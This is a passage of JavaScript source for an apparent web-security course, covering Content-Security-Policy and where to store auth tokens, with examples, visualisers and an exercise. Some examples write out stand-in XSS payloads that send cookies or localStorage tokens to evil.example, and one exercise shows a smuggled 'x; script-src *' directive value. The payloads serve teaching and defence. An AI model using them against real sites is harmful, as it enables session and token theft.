          if (t.indexOf('*.') === 0 && r.host.slice(-(t.length - 1)) === t.slice(1)) return true;
          var h = t.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
          if (t.charAt(0) !== "'" && t.charAt(t.length - 1) !== ':' && h === r.host) return true;
        }
        return false;
      }
      var frames = [];
      var prow = order.map(function (n) { return ['<code>' + n + '</code>', '<code>' + pol[n].join(' ').replace(/</g, '&lt;') + '</code>']; });
      frames.push({
        narr: 'The server sent this CSP. The browser keeps it as a list of <b>directives</b>. For every resource the page wants, it looks for the matching directive (falling back to <code>default-src</code>) and checks the source list.',
        parts: [{ type: 'table', label: 'Parsed policy', columns: ['Directive', 'Allowed sources'], rows: prow }]
      });
      var rows = [], blocked = 0;
      res.forEach(function (r) {
        var f = find(r.k), ok, dn;
        if (!f) { ok = true; dn = '(no directive: unrestricted)'; } else { dn = f.n; ok = allows(f.l, r); }
        if (!ok) blocked++;
        rows.push([r.d, '<code>' + dn + '</code>', ok ? '<span class="c-g">ALLOWED</span>' : '<span class="c-r">BLOCKED</span>']);
        var hl = {}; hl[rows.length - 1] = ok ? 'ok' : 'bad';
        frames.push({
          narr: '<b>' + r.d + '</b> is checked against <code>' + dn + '</code>. ' + (ok ? '<span class="c-g">A source matches, so it loads.</span>' : '<span class="c-r">No source matches, so the browser refuses it and logs a violation in the console (and sends a report if configured).</span>'),
          parts: [{ type: 'table', label: 'Resource decisions', columns: ['Resource', 'Directive used', 'Verdict'], rows: rows.slice(), hl: hl }]
        });
      });
      frames.push({
        narr: 'Summary: <b>' + blocked + ' of ' + res.length + '</b> resources were blocked. Notice what the policy does for XSS: the injected script file, the injected inline script and the inline handler are blocked; only code that carries the secret nonce or comes from a listed host runs.',
        parts: [{ type: 'table', label: 'Final decisions', columns: ['Resource', 'Directive used', 'Verdict'], rows: rows.slice() }]
      });
      return frames;
    }
  },
  examples: [
    {
      title: 'CSP rescues you from an XSS bug',
      html: `<p>A comment widget forgets to escape and the attacker posts <code>&lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;</code>. Without CSP the handler runs. With <code>script-src 'self' 'nonce-...'</code> two things stop it: the <b>inline handler</b> is blocked (inline script needs a nonce, and handlers cannot carry one), and even if it ran, <code>connect-src 'self'</code> would block the request to evil.example. CSP does not fix the bug, but it turns a critical bug into a console warning plus a report to your security team.</p>`
    },
    {
      title: 'Allowlist CSP vs nonce-based "strict" CSP',
      html: `<p>Old style: <code>script-src 'self' https://cdn.example.com https://www.google-analytics.com</code>. Problem: you trust <i>everything</i> on those hosts. If a CDN hosts a JSONP endpoint or an old library with a known gadget, an attacker can load it and run code. Google’s research found the great majority of real allowlist CSPs were bypassable. New style: <code>script-src 'nonce-R4nd0m' 'strict-dynamic'</code>. Only scripts <i>you</i> tagged with the per-response nonce run, plus whatever those scripts load. That is easy to maintain and much harder to bypass. Caveat: the nonce must be unguessable and different on every response; a static or cached nonce is useless.</p>`
    },
    {
      title: 'Rolling out CSP on a legacy site',
      html: `<p>Week 1: send <code>Content-Security-Policy-Report-Only</code> with a <code>report-to</code> endpoint (or a service like a CSP report collector). Week 2-3: fix top violations: move inline scripts to files or add nonces, replace <code>onclick="..."</code> with <code>addEventListener</code>, list real API hosts in <code>connect-src</code>. Week 4: enforce on 5% of traffic (header added by the CDN), then 100%. Keep Report-Only running with a stricter next-step policy in parallel.</p>
      ${H.table(['Phase', 'Header', 'Effect'], [['1', 'Report-Only', 'No blocking, you learn'], ['2', 'Enforce (basic: object-src, base-uri, frame-ancestors)', 'Cheap wins, almost never breaks anything'], ['3', 'Enforce script-src nonces', 'The real XSS protection'], ['4', 'Add Trusted Types (<code>require-trusted-types-for \'script\'</code>)', 'Locks the DOM XSS sinks']])}`
    },
    {
      title: 'Clickjacking in action, and the one-line fix',
      html: `<p>The attacker’s page shows a "Play video" button; underneath, an invisible iframe of <code>https://social.example/post?text=I+love+scams</code> with its Post button aligned to the decoy. One real click by a logged-in user posts the message. Fix on the <i>victim site</i>: <code>Content-Security-Policy: frame-ancestors 'none'</code> (and <code>X-Frame-Options: DENY</code>). The browser then refuses to render the page in any frame. If you need to be embeddable by one partner, name them: <code>frame-ancestors https://partner.example</code>. For sensitive actions also require a confirmation or re-authentication step that a blind click cannot complete.</p>`
    }
  ],
  deepDive: `<p><b>How nonces and hashes are evaluated.</b> When the parser meets an inline script, the browser compares its <code>nonce</code> attribute with the policy’s nonce list, or computes the script text’s hash and compares that to <code>'sha256-...'</code> entries. If either matches, the script is allowed. The nonce value is then hidden from the DOM (<code>script.nonce</code> property keeps it, the attribute reads empty) to stop CSS-selector exfiltration of nonces. Nonce-carrying scripts can load more scripts only if <code>'strict-dynamic'</code> is present; with it, host allowlists are ignored by modern browsers, while old browsers fall back to them: that is why strict policies often include both.</p>
  <p><b>Common bypasses and mistakes.</b> <code>'unsafe-inline'</code> without a nonce (negates the policy), <code>*</code> or <code>https:</code> in <code>script-src</code>, a wildcard CDN host like <code>*.googleapis.com</code> (hosts JSONP and Angular), missing <code>object-src 'none'</code> and <code>base-uri</code> (an injected <code>&lt;base href&gt;</code> changes where relative scripts load from), <code>data:</code> in <code>script-src</code>, reflecting user input into the policy, and caching an HTML response with its nonce in a CDN (every user gets the same nonce).</p>
  <p><b>Reports and observability.</b> <code>report-to</code> (Reporting API, with a <code>Reporting-Endpoints</code> header) is the modern way; <code>report-uri</code> is older but still widely used. Expect noise from browser extensions injecting scripts; filter reports by <code>source-file</code> and <code>blocked-uri</code> before alerting.</p>
  <p><b>Limits of meta tags.</b> <code>&lt;meta http-equiv="Content-Security-Policy"&gt;</code> works for most directives but cannot express <code>frame-ancestors</code>, <code>report-uri</code> or <code>sandbox</code>, and only applies to content after the tag. Prefer the HTTP header. Static hosts (S3, GitHub Pages) often can only use meta, or need a CDN rule to add headers.</p>
  <p><b>Clickjacking depth.</b> <code>frame-ancestors</code> checks the whole ancestor chain (top page and every intermediate frame), whereas old <code>X-Frame-Options: ALLOW-FROM</code> was inconsistently implemented and is obsolete. <code>SameSite</code> cookies help too: a Lax cookie is not sent to a cross-site iframe, so the framed page loads logged-out. Beyond frames: <i>drag-and-drop</i> clickjacking, <i>cursorjacking</i>, and likejacking. The Permissions-Policy header and <code>iframe sandbox</code>/<code>allow</code> attributes restrict what <em>your embeds</em> may do, a mirror problem when you embed others.</p>
  <p><b>Related headers.</b> <code>X-Content-Type-Options: nosniff</code> (stop the browser guessing MIME types, which can turn an uploaded text file into script), <code>Referrer-Policy</code> (limit URL leakage), <code>Cross-Origin-Opener-Policy</code> / <code>Cross-Origin-Embedder-Policy</code> (isolation), and <code>Strict-Transport-Security</code> (next topics).</p>`,
  aiEra: `<p><b>What AI changes:</b> Generating a first CSP used to mean days of reading violation reports. Now an assistant can ingest your <code>Report-Only</code> logs and propose a policy, find inline handlers to refactor, and list which third-party tags need which directives. AI-generated front-ends, however, tend to be full of inline scripts, inline styles and CDN snippets pasted from tutorials, which makes strict CSP harder unless your build step handles them.</p>
  <p><b>Use AI as a partner:</b> paste your violation reports and ask <code>Group these CSP violations by directive and root cause, propose the smallest policy change for each, and mark any that would require unsafe-inline</code>. Ask it to review a policy for known bypasses (wildcard hosts, JSONP, missing base-uri).</p>
  <p><b>Where AI goes wrong:</b> it "fixes" a broken page by adding <code>'unsafe-inline'</code> or <code>'unsafe-eval'</code>, suggests <code>script-src *</code>, generates a static nonce constant in code, and puts CSP in a meta tag when it needs <code>frame-ancestors</code>. For LLM chat UIs it forgets that <code>img-src</code> allows data exfiltration via image URLs rendered from model output.</p>
  <p><b>What you must still own:</b> the trade-off decisions (which third-party scripts earn trust), per-response nonce generation that survives caching, and the rollout plan. Treat the policy as code: version it, test it in CI with a headless browser, and monitor reports.</p>`,
  problems: [{
    title: 'Write a CSP Header for a Given App',
    level: 'Medium', tags: ['CSP', 'headers', 'XSS defence'], companies: ['Google', 'Dropbox', 'Cloudflare'],
    statement: `<p>Write <code>buildCsp(app, nonce)</code> returning a <code>Content-Security-Policy</code> header <em>value</em>. <code>app</code> has: <code>apiHosts</code> (array of origins for fetch/XHR), <code>imageHosts</code> (array), <code>frameEmbeds</code> (array of origins this app embeds), <code>framedBy</code> (array of origins allowed to embed this app; empty means nobody), <code>inlineStyles</code> (boolean). Required directives in this order: <code>default-src 'self'</code>; <code>script-src 'self' 'nonce-NONCE' 'strict-dynamic'</code>; <code>style-src 'self'</code> plus <code>'unsafe-inline'</code> only if <code>inlineStyles</code>; <code>img-src 'self' data:</code> plus image hosts; <code>connect-src 'self'</code> plus API hosts; <code>frame-src</code> only if embeds exist; <code>object-src 'none'</code>; <code>base-uri 'none'</code>; <code>form-action 'self'</code>; <code>frame-ancestors</code> with the list or <code>'none'</code>. Join with <code>; </code>. Reject nonces shorter than 16 characters.</p>`,
    constraints: `Hosts are origins like <code>https://api.example.com</code>. Reject any host containing a space, semicolon or comma.`,
    example: `<p>Input: app = <code>{ apiHosts: ['https://api.example.com'], imageHosts: [], frameEmbeds: [], framedBy: [], inlineStyles: false }</code>, nonce <code>AAAAAAAAAAAAAAAA</code>.</p><pre>default-src 'self'; script-src 'self' 'nonce-AAAAAAAAAAAAAAAA' 'strict-dynamic'; style-src 'self'; img-src 'self' data:; connect-src 'self' https://api.example.com; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'</pre><p>Why: scripts need the nonce, the only extra network target is the API, nothing may frame the app.</p>`,
    brute: {
      why: `<p>The lazy policy is <code>default-src *; script-src * 'unsafe-inline' 'unsafe-eval'</code> ("make the console errors go away"). It is technically a CSP but it allows everything, so it protects nothing. A smaller trap: building the policy by pasting user-supplied hosts directly, which lets a value like <code>x; script-src *</code> append directives.</p>`,
      code: `function buildCspBrute() {
  // Allows everything: looks like security, behaves like none
  return "default-src * 'unsafe-inline' 'unsafe-eval'";
}`
    },
    mcq: { q: 'Which change makes a nonce-based script-src USELESS?', options: ['Generating a new nonce on every response', 'Using the same nonce in a cached HTML page for all users', 'Adding strict-dynamic', 'Adding object-src none'], answer: 1, explain: 'If every visitor gets the same nonce, an attacker who reads it once (their own visit) can put it on injected scripts. The nonce must be unpredictable and unique per response.' },
    hints: [
      `<p>Hint 1: Start from the deny-by-default skeleton (<code>default-src 'self'</code>) and add only the origins the app proves it needs.</p>`,
      `<p>Hint 2: Validate before building: nonce length and characters, and host strings (no space, <code>;</code>, <code>,</code>) because an unvalidated value can inject a whole extra directive.</p>`,
      `<p>Hint 3: Recipe: build an array of directive strings in the required order, using small helpers to append hosts; <code>frame-src</code> is included only when <code>frameEmbeds.length &gt; 0</code>; <code>frame-ancestors</code> is the list or <code>'none'</code>; join with <code>'; '</code>.</p>`
    ],
    solution: {
      approach: `<p>Validate inputs, then assemble directives in a fixed order. A fixed order makes the header diff-friendly in code review and tests. Everything not explicitly listed falls back to <code>default-src 'self'</code> or to a hard <code>'none'</code>.</p>`,
      code: {
        lang: 'js', run: true, code: `function cleanHost(h) {
  if (typeof h !== 'string' || /[\\s;,]/.test(h)) throw new Error('bad host: ' + h);
  return h;
}
function withHosts(base, hosts) {
  return base + (hosts || []).map(function (h) { return ' ' + cleanHost(h); }).join('');
}

function buildCsp(app, nonce) {
  if (typeof nonce !== 'string' || nonce.length < 16 || /[^A-Za-z0-9+/=_-]/.test(nonce)) throw new Error('weak or malformed nonce');
  var d = [
    "default-src 'self'",
    "script-src 'self' 'nonce-" + nonce + "' 'strict-dynamic'",
    "style-src 'self'" + (app.inlineStyles ? " 'unsafe-inline'" : ''),
    withHosts("img-src 'self' data:", app.imageHosts),
    withHosts("connect-src 'self'", app.apiHosts)
  ];
  if (app.frameEmbeds && app.frameEmbeds.length) d.push(withHosts('frame-src', app.frameEmbeds));
  d.push("object-src 'none'", "base-uri 'none'", "form-action 'self'");
  d.push(app.framedBy && app.framedBy.length ? withHosts('frame-ancestors', app.framedBy) : "frame-ancestors 'none'");
  return d.join('; ');
}

console.log(buildCsp({ apiHosts: ['https://api.example.com'], imageHosts: [], frameEmbeds: [], framedBy: [], inlineStyles: false }, 'AAAAAAAAAAAAAAAA'));
console.log(buildCsp({ apiHosts: [], imageHosts: ['https://img.example.com'], frameEmbeds: ['https://www.youtube.com'], framedBy: ['https://partner.example'], inlineStyles: true }, 'BBBBBBBBBBBBBBBB'));
try { buildCsp({ apiHosts: ['https://x.com; script-src *'] }, 'AAAAAAAAAAAAAAAA'); } catch (e) { console.log('rejected: ' + e.message); }`
      },
      dry: {
        head: ['Step', 'Directive added', 'Why'],
        rows: [
          ['1', "default-src 'self'", 'deny by default'],
          ['2', "script-src 'self' 'nonce-...' 'strict-dynamic'", 'only your tagged scripts'],
          ['3', "connect-src 'self' https://api.example.com", 'only known APIs'],
          ['4', "frame-ancestors 'none'", 'clickjacking defence (framedBy is empty)']
        ]
      },
      complexity: `<p>O(total hosts) time and output size.</p>`,
      followUps: ['How would you generate a different nonce on each request while still caching the static parts of the HTML?', 'What changes if the page needs Google Tag Manager?']
    }
  }]
});

/* ============================ TOPIC 7: AUTH TOKEN STORAGE ============================ */
topics.push({
  title: 'Where to Store Auth Tokens: localStorage vs HttpOnly Cookies',
  analogy: `<p>After you log in, the site gives you a <b>hotel key card</b> (the token). Where do you keep it? Option 1: in the <b>lobby fruit bowl</b> (<code>localStorage</code>): easy to grab, but any guest or cleaner (any script on the page) can pick it up, copy it, and walk off to use it at home. Option 2: in a <b>sealed pocket you cannot open yourself</b> (an <code>HttpOnly</code> cookie): the hotel door reader pulls it out automatically, scripts cannot copy it, but a trickster can still push you through a door (CSRF) so you need extra rules. Option 3: a <b>short-lived card in your hand</b> (memory) plus a <b>sealed spare</b> in the pocket to fetch a new card when the old one dies. There is no perfect place; there is a best place for <em>your</em> threats.</p>`,
  explain: `<p>An <b>auth token</b> proves "I already logged in". If an attacker gets it, they <em>are</em> you until it expires or is revoked. So storage is a question of "which attack do I fear more, and what can I defend?"</p>
  ${H.table(['Where', 'XSS can read it?', 'CSRF risk', 'Survives reload', 'Notes'], [
    ['<b>localStorage</b>', H.c('r', 'Yes, trivially'), H.c('g', 'None (not auto-sent)'), 'Yes, all tabs', 'Simple for SPAs, but an XSS exfiltrates a <b>portable</b> token that works from the attacker’s machine'],
    ['<b>sessionStorage</b>', H.c('r', 'Yes'), H.c('g', 'None'), 'Only this tab', 'Same XSS exposure, slightly shorter life'],
    ['<b>JS memory</b> (a variable)', H.c('y', 'Only by code running in the same page, while open'), H.c('g', 'None'), H.c('r', 'No: lost on refresh'), 'Needs a way to get a new token silently (refresh cookie)'],
    ['<b>HttpOnly cookie</b>', H.c('g', 'No, cannot be read or exported'), H.c('y', 'Yes, defend with SameSite + CSRF token'), 'Yes', 'XSS can still <i>use</i> it (requests from the victim’s browser) but cannot take it away'],
    ['<b>BFF session</b> (server holds tokens)', H.c('g', 'No tokens in the browser at all'), H.c('y', 'Cookie rules apply'), 'Yes', 'Backend-for-Frontend: browser has only an HttpOnly session cookie']
  ])}
  <h4>The three patterns you should know</h4>
  <ol>
    <li><b>Server session + HttpOnly cookie</b>. The cookie holds a random id; the server stores the user. Cookie flags: <code>Secure; HttpOnly; SameSite=Lax</code> plus CSRF protection for unsafe requests. Best default for first-party apps, including SPAs whose API is on the same site.</li>
    <li><b>Short-lived access token in memory + refresh token in an HttpOnly cookie</b>. The access token (JWT, 5-15 min) rides in <code>Authorization: Bearer</code> from a JS variable. On page load or a 401, the app calls <code>/refresh</code>; the browser attaches the refresh cookie (path-restricted, SameSite) and gets a new access token. Rotate the refresh token on every use and detect reuse.</li>
    <li><b>BFF (Backend for Frontend)</b>. A small server next to your SPA does the OAuth/OIDC dance and keeps access/refresh tokens on the server. The browser only has an HttpOnly session cookie and calls the BFF, which calls your APIs. This is what current OAuth guidance for browser apps recommends for high-value apps.</li>
  </ol>
  <p><b>Decision guide:</b></p>
  <ul>
    <li>API and UI on the same site? → plain session cookie (pattern 1).</li>
    <li>Different sites, high-value data (money, admin, health)? → BFF (pattern 3).</li>
    <li>Different sites, ordinary app? → memory + refresh cookie (pattern 2).</li>
    <li><code>localStorage</code> only for low-value, short-lived tokens, with a strict CSP and Trusted Types, and when you accept the risk knowingly.</li>
  </ul>
  <p><b>The honest truth about XSS.</b> If an attacker has XSS, <i>no</i> storage choice saves you: they can call your API from inside the page, even with HttpOnly. HttpOnly only stops them from <b>taking the credential away</b> and using it later from elsewhere. That is still a big win (smaller blast radius, no persistent access), but your first line of defence must be preventing XSS (escaping, CSP).</p>
  <p><b>JWT quick facts.</b> A JWT is three base64url parts: header.payload.signature. It is signed, <em>not encrypted</em>: never put secrets in the payload. Always verify signature, <code>exp</code>, <code>iss</code> and <code>aud</code> and pin the algorithm. Stateless JWTs cannot be revoked before expiry, which is why they must be short-lived.</p>`,
  clues: [
    '"Where should the SPA keep the JWT?" → trade-off discussion: localStorage (XSS) vs HttpOnly cookie (CSRF)',
    '"XSS steals the token" → HttpOnly cookie or memory; "token in <code>localStorage</code>" is the anti-pattern',
    '"Cookie auth" → must discuss CSRF and SameSite',
    '"Short-lived access token + refresh token rotation" → pattern 2; reuse detection',
    '"High-value app, OAuth, SPA" → BFF, authorization code + PKCE (never the implicit flow)',
    '"Log out everywhere / revoke a stolen token" → server-side session or token denylist; short TTL',
    '"Remember me" → longer refresh cookie with device binding and rotation, not a long-lived access token'
  ],
  code: [
    {
      lang: 'js', run: true, title: 'Token storage decision helper (runs in your browser)',
      code: `// Encode the decision guide as code. Facts about the app in, recommendation + reasons out.
function chooseTokenStorage(app) {
  var why = [];
  var choice;
  if (app.needsEmbedding) {
    choice = 'HttpOnly cookie, SameSite=None; Secure; Partitioned';
    why.push('page runs inside third-party iframes, so the cookie must be sent cross-site');
    why.push('add a CSRF token and check Origin because SameSite no longer protects you');
  } else if (app.apiSameSite) {
    choice = 'HttpOnly session cookie (SameSite=Lax)';
    why.push('UI and API share a site, so cookies flow without CORS tricks');
    why.push('add CSRF protection for non-GET requests');
  } else if (app.highValue) {
    choice = 'BFF + session cookie';
    why.push('high value data: keep OAuth tokens on the server, none in the browser');
  } else if (app.strictCsp && app.tokenMinutes <= 15) {
    choice = 'localStorage short-lived token (accepted risk)';
    why.push('low value, short lifetime and a strict CSP limit the damage of XSS');
  } else {
    choice = 'access token in memory + HttpOnly refresh cookie';
    why.push('different sites: short-lived token in a variable, refresh via path-limited cookie');
    why.push('rotate the refresh token and detect reuse');
  }
  return { choice: choice, why: why };
}

var apps = [
  { name: 'Shop (SSR, same site)',          apiSameSite: true },
  { name: 'Banking dashboard on 2 sites',   apiSameSite: false, highValue: true },
  { name: 'Weather SPA, public API',        apiSameSite: false, highValue: false, strictCsp: true, tokenMinutes: 10 },
  { name: 'Notes SPA, weak CSP',            apiSameSite: false, highValue: false, strictCsp: false, tokenMinutes: 60 },
  { name: 'Payment widget in partner site', needsEmbedding: true }
];
apps.forEach(function (a) {
  var r = chooseTokenStorage(a);
  console.log(a.name + '\\n  -> ' + r.choice + '\\n     ' + r.why.join('\\n     '));
});`
    },
    {
      lang: 'js', title: 'Pattern 2: token in memory, silent refresh (browser code)',
      code: `// The access token lives ONLY in this variable. XSS elsewhere cannot read it from storage,
// and a reload simply fetches a new one using the HttpOnly refresh cookie.
let accessToken = null;
let refreshing = null;                      // share ONE refresh call between concurrent requests

async function refreshAccessToken() {
  if (!refreshing) {
    refreshing = fetch('/auth/refresh', { method: 'POST', credentials: 'include' })
      .then(function (r) { if (!r.ok) throw new Error('logged out'); return r.json(); })
      .then(function (data) { accessToken = data.accessToken; return accessToken; })
      .finally(function () { refreshing = null; });
  }
  return refreshing;
}

async function api(path, options) {
  options = options || {};
  if (!accessToken) await refreshAccessToken();
  let res = await fetch(path, Object.assign({}, options, { headers: Object.assign({}, options.headers, { Authorization: 'Bearer ' + accessToken }) }));
  if (res.status === 401) {                  // expired: refresh once and retry once
    await refreshAccessToken();
    res = await fetch(path, Object.assign({}, options, { headers: Object.assign({}, options.headers, { Authorization: 'Bearer ' + accessToken }) }));
  }
  return res;
}`
    },
    {
      lang: 'js', check: false, title: 'Server: issue refresh cookie, rotate, and log out (Express)',
      code: `app.post('/auth/login', async (req, res) => {
  const user = await verifyPassword(req.body.email, req.body.password);   // your auth code
  const { access, refresh } = await issueTokens(user);                     // access ~10 min, refresh ~14 days
  res.cookie('__Secure-refresh', refresh, {
    httpOnly: true, secure: true, sameSite: 'strict',
    path: '/auth',                       // only sent to /auth/*, not to every API call
    maxAge: 14 * 24 * 3600 * 1000
  });
  res.json({ accessToken: access });
});

app.post('/auth/refresh', async (req, res) => {
  const used = req.cookies['__Secure-refresh'];
  const next = await rotateRefreshToken(used);            // marks "used" as spent, returns a new one
  if (!next) {                                             // reuse of a spent token = theft signal
    await revokeFamily(used);
    return res.status(401).end();
  }
  res.cookie('__Secure-refresh', next.refresh, { httpOnly: true, secure: true, sameSite: 'strict', path: '/auth' });
  res.json({ accessToken: next.access });
});

app.post('/auth/logout', (req, res) => {
  res.set('Clear-Site-Data', '"cookies", "storage"');       // wipe client-side state
  res.clearCookie('__Secure-refresh', { path: '/auth' });
  res.sendStatus(204);
});`
    }
  ],
  codeTitle: ['chooseTokenStorage', 'Memory token + silent refresh', 'Refresh rotation on the server'],
  viz: {
    title: 'Token storage options under different attacks',
    input: 'xss',
    inputLabel: 'Attack to test: xss | csrf | reload',
    gen: function (input) {
      var a = String(input).trim().toLowerCase();
      if (['xss', 'csrf', 'reload'].indexOf(a) < 0) throw new Error('Type one of: xss, csrf, reload');
      var opts = ['localStorage', 'sessionStorage', 'memory + HttpOnly refresh cookie', 'HttpOnly session cookie'];
      var data = {
        xss: [
          ['bad', 'Injected script reads <code>localStorage.getItem("token")</code> and posts it to the attacker. The token works from <b>any machine</b> until it expires.'],
          ['bad', 'Same: <code>sessionStorage</code> is readable by any script in the tab. Only shorter-lived.'],
          ['warn', 'The refresh cookie cannot be read. The 10-minute access token variable can be grabbed only if the script gets at it while the page is open. Damage is limited in time.'],
          ['warn', 'The cookie cannot be read or exported. The attacker can still send requests from the victim’s browser while the XSS lives, but cannot take the session away.']
        ],
        csrf: [
          ['ok', 'The token is added by JS in an <code>Authorization</code> header. A forged cross-site form cannot add it, so CSRF does not apply.'],
          ['ok', 'Same as localStorage: nothing is attached automatically.'],
          ['ok', 'API calls use a header, so no CSRF. The <code>/refresh</code> endpoint uses a cookie, but with <code>SameSite=Strict</code> and a JSON-only response the attacker cannot read, it is protected.'],
          ['warn', 'The browser attaches the cookie automatically, so you <b>must</b> add SameSite=Lax/Strict plus an anti-CSRF token or Origin check.']
        ],
        reload: [
          ['ok', 'Still there after reload, and in new tabs.'],
          ['warn', 'Survives a reload but is gone in a new tab or after closing the tab: users get logged out.'],
          ['warn', 'The variable is lost on reload. The app calls <code>/refresh</code> on startup (one extra request) and the user stays logged in.'],
          ['ok', 'Cookie persists according to Max-Age; every tab shares it.']
        ]
      }[a];
      var cls = { ok: 'c-g', warn: 'c-y', bad: 'c-r' };
      var lab = { ok: 'good', warn: 'depends', bad: 'bad' };
      var hlc = { ok: 'ok', warn: 'cur', bad: 'bad' };
      var frames = [], rows = [];
      var title = { xss: 'An attacker finds an XSS bug and injects a script into your page.', csrf: 'evil.com tries to forge a request to your API from the victim’s browser.', reload: 'The user presses F5 or opens a second tab.' }[a];
      frames.push({
        narr: 'Scenario: <b>' + title + '</b> We check four ways to store the login token, one at a time. Green is good, amber means "depends on your extra defences", red is bad.',
        parts: [{ type: 'table', label: 'Storage options', columns: ['Where the token lives', 'What happens', 'Verdict'], rows: opts.map(function (o) { return [o, '(not tested yet)', '']; }) }]
      });
      opts.forEach(function (o, i) {
        var d = data[i];
        rows.push([o, d[1], '<span class="' + cls[d[0]] + '">' + lab[d[0]] + '</span>']);
        var hl = {}; hl[i] = hlc[d[0]];
        var left = opts.slice(i + 1).map(function (x) { return [x, '(not tested yet)', '']; });
        frames.push({
          narr: '<b>' + o + '</b>: ' + d[1],
          parts: [{ type: 'table', label: 'Storage options', columns: ['Where the token lives', 'What happens', 'Verdict'], rows: rows.concat(left), hl: hl }]
        });
      });
      frames.push({
        narr: a === 'xss' ? 'Lesson: against XSS, HttpOnly (or memory with short lifetime) shrinks the damage, but nothing makes XSS harmless. Prevent XSS first (escaping, CSP).' : (a === 'csrf' ? 'Lesson: header-based tokens dodge CSRF, cookie-based tokens need SameSite and an anti-CSRF defence.' : 'Lesson: usability matters. Memory storage needs a silent refresh flow so users are not logged out by a reload.'),
        parts: [{ type: 'table', label: 'Final verdicts', columns: ['Where the token lives', 'What happens', 'Verdict'], rows: rows.slice() }]
      });
      return frames;
    }
  },
  examples: [
    {
      title: 'The tutorial pattern and what an attacker gets',
      html: `<p>Many tutorials do <code>localStorage.setItem('token', jwt)</code> and <code>Authorization: Bearer</code> on each fetch. It works. Now a single XSS (say a vulnerable npm package that injects HTML) runs <code>fetch('https://evil.example/?t=' + localStorage.token)</code>. The attacker pastes your token into their own tool and has your account for the token’s whole lifetime, even after you close the tab and even after the XSS is fixed. Contrast with an HttpOnly cookie: the script cannot export the credential, so when you patch the bug the attacker’s access ends.</p>`
    },
    {
      title: 'Cookie session for a same-site SPA',
      html: `<p>App at <code>app.shop.com</code>, API at <code>api.shop.com</code> (same site, different origin). Login sets <code>__Host-sid</code> on <code>api.shop.com</code> (HttpOnly, Secure, SameSite=Lax). The SPA calls <code>fetch('https://api.shop.com/me', { credentials: 'include' })</code>; the API returns CORS headers with the exact origin and <code>Allow-Credentials: true</code>. For POST/PUT/DELETE the SPA also sends an <code>X-CSRF-Token</code>. No token touches JavaScript storage.</p>`
    },
    {
      title: 'Refresh-token rotation and reuse detection',
      html: `<p>Each refresh call returns a <b>new</b> refresh token and invalidates the old one. If an old token is ever used again, either the user or a thief has two copies, so the server revokes the entire token family and forces a login.</p>
      ${H.table(['Step', 'Browser', 'Server'], [['1', 'POST /refresh with cookie R1', 'Marks R1 used, issues R2 + access A2'], ['2', 'Stores A2 in memory, R2 cookie replaces R1', '-'], ['3', 'Thief replays stolen R1', H.c('r', 'R1 already used → revoke R1, R2, all descendants')], ['4', 'User’s next refresh fails', 'User logs in again; thief is out']])}`
    },
    {
      title: 'BFF: the browser never sees the tokens',
      html: `<p>The SPA is served by <code>bff.shop.com</code>. "Log in" redirects through the identity provider (authorization code + PKCE) back to the BFF, which stores access/refresh tokens in its own session store. The browser holds <code>__Host-sid</code> only. The SPA calls <code>/api/orders</code> on the BFF, which adds the bearer token and forwards to the real API. XSS can no longer steal any OAuth token, and the real API is never exposed to browser CORS rules. Cost: one more service to run and scale.</p>`
    }
  ],
  deepDive: `<p><b>Why "XSS makes everything equal" is only half true.</b> Researchers describe two XSS capabilities: <i>session riding</i> (use the credential through the victim’s browser while the script runs) and <i>credential theft</i> (copy it and use it later elsewhere). HttpOnly blocks the second. Threat models care because stolen credentials can be sold, scripted at scale, and used from the attacker’s own IP after the bug is fixed. Short TTLs, refresh-token rotation, and device binding (DBSC, or token binding via DPoP for OAuth) shrink the second window further.</p>
  <p><b>OAuth for browser apps.</b> Use the <b>authorization code flow with PKCE</b>; the implicit flow (token in the URL fragment) is deprecated because tokens leak via history and referrers. The current IETF BCP for browser-based apps ranks architectures: BFF first, then a token-mediating backend, then a pure SPA with in-memory tokens, discouraging persistent browser storage. If the SPA is a "public client", the refresh token should be sender-constrained or rotated.</p>
  <p><b>DPoP.</b> Demonstrating Proof-of-Possession binds a token to a key pair held by the client: each API call carries a signed proof for that request. A stolen token without the (non-extractable WebCrypto) private key is useless. Browsers store such keys in IndexedDB as non-exportable <code>CryptoKey</code> objects.</p>
  <p><b>Details that bite.</b> (1) Service workers and multiple tabs: coordinate refresh with a <code>BroadcastChannel</code> or a Web Lock so two tabs do not both rotate and trigger reuse detection. (2) Cookie size limits and the <code>Path</code> attribute: a refresh cookie scoped to <code>/auth</code> is not sent on every request. (3) CORS with credentials: no wildcards. (4) <code>Authorization</code> headers always trigger a preflight on cross-origin fetches. (5) Logout must clear server state, cookies and in-memory tokens (and ideally invalidate at the IdP). (6) Never put tokens in URLs or the <code>Referer</code> will leak them; use the <code>Referrer-Policy</code> header and POST bodies.</p>
  <p><b>JWT pitfalls.</b> Accepting <code>alg: none</code> or letting the token choose between HS256 and RS256 (key confusion) has caused real breaches; pin the algorithm and key. Do not put PII or permissions that change quickly in the payload. Keep a server-side session if you need instant revocation: "stateless" is a trade-off, not a virtue.</p>
  <p><b>Passkeys.</b> WebAuthn/passkeys remove passwords but still end with a session token or cookie after authentication; the storage question stays the same, and sessions should be re-checked for sensitive actions (step-up).</p>`,
  aiEra: `<p><b>What AI changes:</b> Tutorials and AI assistants overwhelmingly produce <code>localStorage</code> + JWT examples, because they are the shortest to write. AI-built apps therefore ship this pattern at scale. At the same time, attackers use AI to find injectable inputs and to write evasive payloads, so the "we don't have XSS" assumption is weaker than ever. Autonomous agents also hold tokens for you; scope them narrowly (least privilege, short TTL, per-task tokens).</p>
  <p><b>Use AI as a partner:</b> describe your architecture (domains, who calls whom, data sensitivity) and ask <code>Compare token storage options for this setup against XSS, CSRF, and reload. Recommend one and list the extra headers/flags needed. Challenge your own answer.</code> Ask it to write the rotation and reuse-detection tests.</p>
  <p><b>Where AI goes wrong:</b> it recommends <code>localStorage</code> "for simplicity", claims HttpOnly cookies "are immune" to XSS, forgets CSRF once cookies are chosen, builds refresh logic that races across tabs, and shows JWTs with long expiry and sensitive claims.</p>
  <p><b>What you must still own:</b> naming the threat model and defending the answer in a design review. In an interview, state the trade-off, pick one, and say what you would add (CSP, SameSite, rotation, BFF) rather than claiming a perfect option exists.</p>`,
  problems: [{
    title: 'Pick the Token Storage Strategy',
